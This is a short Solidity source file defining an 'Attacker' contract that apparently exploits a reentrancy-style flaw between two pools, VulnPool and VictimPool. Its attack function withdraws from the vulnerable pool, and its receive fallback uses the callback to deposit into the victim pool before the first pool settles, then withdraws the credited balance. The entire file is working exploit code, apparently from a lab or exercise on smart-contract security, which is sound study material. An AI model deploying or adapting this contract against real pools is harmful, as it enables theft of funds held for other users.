// SPDX-License-Identifier:  None
pragma solidity 0.8.20;

import "./victim.sol";


contract Attacker {
    VulnPool public vulnPool;

    VictimPool public victimPool;

    uint256 public counter;

    constructor(address vulnerable_pool, address victim_pool) payable {
        vulnPool = VulnPool(vulnerable_pool);
        victimPool = VictimPool(victim_pool);
        counter = 0;

    }


    function attack() public {
        vulnPool.deposit{value: 1e18}();
        vulnPool.withdraw(1e18);

        uint256 balance = victimPool.balances(address(this));

        victimPool.withdraw(balance);
    }

    receive() external payable {
        if(counter == 0){
            counter++;
            victimPool.deposit{value: 1e18}(); 
        }
    }
}
